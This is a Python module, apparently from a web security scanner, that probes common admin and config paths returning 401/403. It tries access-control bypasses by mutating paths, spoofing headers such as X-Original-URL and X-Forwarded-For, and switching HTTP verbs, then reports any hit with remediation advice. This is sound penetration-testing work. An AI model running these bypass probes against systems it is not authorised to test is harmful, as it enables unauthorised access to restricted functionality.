"""
auth_bypass — attempt to bypass 401/403 access controls.

For each path that the server protects (HTTP 401/403), it tries the well-known bypass tricks
red teams use against weak edge/proxy rules:

  * **path mutations** — trailing `/`, `/.`, `//`, `..;/`, `%2e`, case changes…
  * **header spoofing** — `X-Original-URL`, `X-Rewrite-URL`, `X-Forwarded-For: 127.0.0.1`…
  * **verb tampering** — POST/HEAD/OPTIONS instead of GET.

A technique that turns a 403 into a 200 (with real content) is reported as a confirmed bypass.
"""
from __future__ import annotations

import random
import string
from concurrent.futures import ThreadPoolExecutor, as_completed

import httpx
from loguru import logger

from scanner.engine import Finding, Severity, ScanEngine

MODULE = "auth_bypass"

_PROTECTED_PATHS = [
    "/admin", "/admin/", "/administrator", "/manage", "/manager", "/dashboard",
    "/api", "/api/admin", "/private", "/internal", "/config", "/settings",
    "/actuator", "/server-status", "/wp-admin", "/user", "/account", "/console",
    "/.git/config", "/phpmyadmin",
]

_BYPASS_HEADER_SETS = [
    {"X-Original-URL": "{path}"},
    {"X-Rewrite-URL": "{path}"},
    {"X-Forwarded-For": "127.0.0.1"},
    {"X-Forwarded-Host": "127.0.0.1"},
    {"X-Custom-IP-Authorization": "127.0.0.1"},
    {"X-Originating-IP": "127.0.0.1"},
    {"X-Remote-Addr": "127.0.0.1"},
    {"Referer": "{origin}{path}"},
]


def _rand(n: int = 18) -> str:
    return "".join(random.choices(string.ascii_lowercase, k=n))


def _path_variants(path: str) -> list[str]:
    p = "/" + path.strip("/")
    return [p + "/", p + "/.", p + "//", p + "/./", p + "%2e/", p + "..;/", p + ";/",
            p + "/~", p.upper(), p + "%20", "/%2e" + p, p + "?" + _rand(4) + "=1"]


def _is_success(orig: httpx.Response, attempt: "httpx.Response | None", home_text: str = "") -> bool:
    """A bypass works if a previously-forbidden path now returns real 200 content.

    The 200 body must differ from the original 403/401 page AND must not just be the site's generic
    homepage — many path mutations (/admin%20, /ADMIN…) route to the app root, which would otherwise
    be mistaken for a successful bypass.
    """
    if attempt is None or attempt.status_code != 200:
        return False
    body = attempt.text.strip()
    if not body:
        return False
    home = home_text.strip()
    # Routed to the homepage (identical body, or near-identical length for a substantial page) → not a bypass.
    if home and (body == home or (len(home) > 100 and abs(len(body) - len(home)) <= max(16, len(home) // 40))):
        return False
    # Must differ meaningfully from the original forbidden page.
    return abs(len(body) - len(orig.text.strip())) > 32


def _try_path(engine: ScanEngine, variant: str) -> "httpx.Response | None":
    try:
        return engine.request("GET", engine.url + variant)
    except httpx.HTTPError:
        return None


def _try_header(engine: ScanEngine, path: str, headers: dict) -> "httpx.Response | None":
    origin = engine.url
    realised = {k: v.format(path=path, origin=origin) for k, v in headers.items()}
    # X-Original-URL / X-Rewrite-URL are evaluated against the root request.
    target = origin + ("/" if any(k.startswith("X-") and "URL" in k for k in realised) else path)
    try:
        return engine.request("GET", target, headers=realised)
    except httpx.HTTPError:
        return None


def _try_verb(engine: ScanEngine, path: str, method: str) -> "httpx.Response | None":
    try:
        return engine.request(method, engine.url + path)
    except httpx.HTTPError:
        return None


def _attempt_bypass(engine: ScanEngine, path: str, orig: httpx.Response,
                    home_text: str = "") -> "Finding | None":
    # Path mutations
    for variant in _path_variants(path):
        if _is_success(orig, _try_path(engine, variant), home_text):
            return _finding(path, f"path mutation '{variant}'")
    # Header spoofing
    for header_set in _BYPASS_HEADER_SETS:
        if _is_success(orig, _try_header(engine, path, header_set), home_text):
            return _finding(path, f"header {list(header_set)[0]}")
    # Verb tampering
    for method in ("POST", "HEAD", "OPTIONS"):
        if _is_success(orig, _try_verb(engine, path, method), home_text):
            return _finding(path, f"verb tampering ({method})")
    return None


def _finding(path: str, technique: str) -> Finding:
    return Finding(
        module=MODULE,
        title=f"403/401 Access-Control Bypass: {path}",
        description=(
            f"The protected path {path} (originally forbidden) was reached with HTTP 200 using "
            f"{technique}. The access control is enforced only at the edge/proxy and can be "
            "bypassed to reach restricted functionality."
        ),
        severity=Severity.HIGH,
        recommendation=(
            "Enforce authorization in the application itself (not only at the proxy); normalise "
            "paths and ignore client-supplied X-Original-URL/X-Forwarded-* headers."
        ),
        raw={"path": path, "technique": technique, "url": path, "proof_url": path,
             "confidence": "high", "attack": "T1190 Exploit Public-Facing Application",
             "evidence": [f"baseline GET {path} → 401/403 (forbidden)",
                          f"bypass via {technique} → 200 OK with a different, substantial body"]},
    )


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------

def _catch_all(engine: ScanEngine) -> bool:
    try:
        return engine.get(f"/{_rand(22)}").status_code == 200
    except httpx.HTTPError:
        return False


def run(engine: ScanEngine) -> list[Finding]:
    if _catch_all(engine):
        logger.info("auth_bypass: catch-all server (200s everything) — skipping")
        return []

    # The homepage is the baseline that path mutations may accidentally route to.
    try:
        home_text = engine.get().text
    except httpx.HTTPError:
        home_text = ""

    # Find which curated paths are actually protected (401/403).
    protected: list[tuple[str, httpx.Response]] = []
    with ThreadPoolExecutor(max_workers=min(engine.threads, 10)) as pool:
        futures = {pool.submit(_try_path, engine, p): p for p in _PROTECTED_PATHS}
        for fut in as_completed(futures):
            resp = fut.result()
            if resp is not None and resp.status_code in (401, 403):
                protected.append((futures[fut], resp))

    findings: list[Finding] = []
    for path, orig in protected[:6]:
        try:
            hit = _attempt_bypass(engine, path, orig, home_text)
            if hit:
                findings.append(hit)
        except Exception as exc:  # noqa: BLE001
            logger.debug(f"auth_bypass: {path} failed: {exc}")
    logger.info(f"auth_bypass: {len(protected)} protected path(s), {len(findings)} bypass(es)")
    return findings
